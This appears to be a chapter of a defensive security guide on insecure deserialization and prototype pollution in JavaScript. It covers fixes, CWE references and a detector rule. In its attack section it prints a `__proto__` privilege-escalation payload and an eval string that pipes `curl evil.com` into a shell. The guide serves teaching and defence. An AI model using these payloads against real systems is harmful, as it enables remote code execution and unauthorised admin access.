# 08 — Insecure Deserialization

## The Analogy

Imagine someone hands you a sealed envelope and says "these are your new office access settings." Without checking who sent it or what's inside, you execute every instruction. An attacker stuffs the envelope with "give me the master key." Insecure deserialization is exactly that: trusting and executing data without verification.

## What an Attacker Does

1. The tool accepts a JSON string and passes it directly to `JSON.parse()` then `Object.assign()`.
2. The attacker sends: `{"__proto__": {"isAdmin": true}}` — a **prototype pollution** payload.
3. `Object.assign({}, userConfig)` copies `__proto__` onto the base object, poisoning JavaScript's object prototype chain.
4. Every subsequent object in the process now has `isAdmin === true`.

Or they send a string like `"(function(){ require('child_process').exec('curl evil.com | sh') })()"` to an `eval()` call.

## Technical Detail

- **CWE-502**: Deserialization of Untrusted Data — parsing serialized objects without validation allows attacker-controlled state reconstruction.
- **CWE-1321**: Prototype pollution — setting `__proto__` via `Object.assign` or recursive merge mutates the prototype of all objects in the runtime.
- JSON.parse is safe in isolation; the danger is what you *do* with the result (Object.assign, recursive merge, eval, dynamic property access).

## The Fix

- Validate deserialized data against a strict schema (e.g., Zod, Joi) before use.
- Never use `Object.assign(target, untrustedData)` — copy only known keys.
- Never use `eval()` on user-supplied data.
- Use `Object.create(null)` for dictionaries that must accept arbitrary keys.

## Detector

MCP Sentinel's **InsecureDeserializationDetector** flags `Object.assign(t, JSON.parse(...))` and `eval()` on user-controlled strings.

## Authoritative References

| Authority | Resource |
|-----------|----------|
| OWASP | [A08:2021 – Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) |
| OWASP | [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) |
| CISA | [Secure by Design: Eliminate Dangerous Input Patterns](https://www.cisa.gov/secure-by-design) |
| MITRE | [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html) |
| NIST | [NVD CWE-502](https://nvd.nist.gov/vuln/search/results?cwe_id=CWE-502) |
